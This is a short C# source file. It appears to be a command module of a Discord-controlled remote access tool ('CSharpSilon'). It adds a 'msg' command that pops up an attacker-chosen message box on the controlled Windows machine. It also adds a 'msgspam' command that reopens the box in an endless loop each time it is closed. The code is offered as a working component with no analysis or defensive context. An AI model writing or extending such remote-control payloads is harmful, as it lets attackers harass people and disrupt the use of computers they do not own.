using Discord.Commands;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSharpSilon.cmds
{
    public class Messenger : ModuleBase<SocketCommandContext>
    {
        [Command("msg"), Summary("Shows A Text Box With The Specified Title And Message. Title Cannot Have Spaces.")]
        public async Task MSG(string title, [Remainder] string message)
        {
            MessageBox.Show(message, title);
            await ReplyAsync("Message Box Displayed.");
        }
        
        
        [Command("msgspam"), Summary("Constantly Shows A Message Box With The Specified Title And Message, That When Closed Gets Reopened. Title Cannot Have Spaces.")]
        public async Task MSGSpam(string title, [Remainder] string message)
        {
            await ReplyAsync("MessageBox Spam Starting...");
            while (true)
            {
                MessageBox.Show(message, title);
            }

        }
    }
}